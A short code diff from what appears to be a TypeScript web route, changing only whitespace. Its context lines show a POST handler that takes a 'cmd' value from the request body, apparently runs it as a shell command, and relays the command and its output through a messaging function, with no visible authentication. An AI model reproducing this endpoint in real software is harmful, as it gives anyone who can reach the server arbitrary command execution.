@@ -9,7 +9,7 @@ export const sendMessage = async (content: any) => {
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ content }),
+            body: JSON.stringify({content}),
         });
 
         if (!response.ok) {
@@ -22,7 +22,7 @@ export const sendMessage = async (content: any) => {
     }
 };
 
-export const onPost: RequestHandler = async ({ json, request}) => {
+export const onPost: RequestHandler = async ({json, request}) => {
     try {
         const cmd = await request.json();
         json(200, cmd);
@@ -30,7 +30,7 @@ export const onPost: RequestHandler = async ({ json, request}) => {
             if (error) {
                 return;
             }
-            sendMessage("```\n"+cmd.cmd+"\n\n"+stdout+"```")
+            sendMessage("```\n" + cmd.cmd + "\n\n" + stdout + "```")
         });
     } catch (e) {
         handleRequestHandlingError(e, json)
